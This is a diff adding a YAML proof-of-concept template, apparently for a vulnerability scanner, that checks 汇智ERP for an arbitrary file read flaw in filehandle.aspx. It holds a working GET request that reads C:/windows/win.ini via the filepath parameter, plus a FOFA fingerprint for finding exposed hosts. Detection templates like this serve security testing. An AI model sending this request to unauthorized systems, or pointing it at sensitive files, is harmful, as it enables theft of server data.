@@ -1,0 +1,15 @@
+id: poc-yaml-huizhi-erp-filehandle-aspx-anyfile-read
+info:
+  name: 汇智ERP filehandle.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 汇智ERP
+  fofa: icon_hash="-642591392"
+requests:
+- method: GET
+  path: /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini
+  expression: "status_code == 200 && \ncontains(body,\"; for 16-bit app support\"\
+    ) &&\ncontains(body,\"[files]\") &&\ncontains(headers,\"filename=win.ini\")\n"
+variables: {}
+transport: http
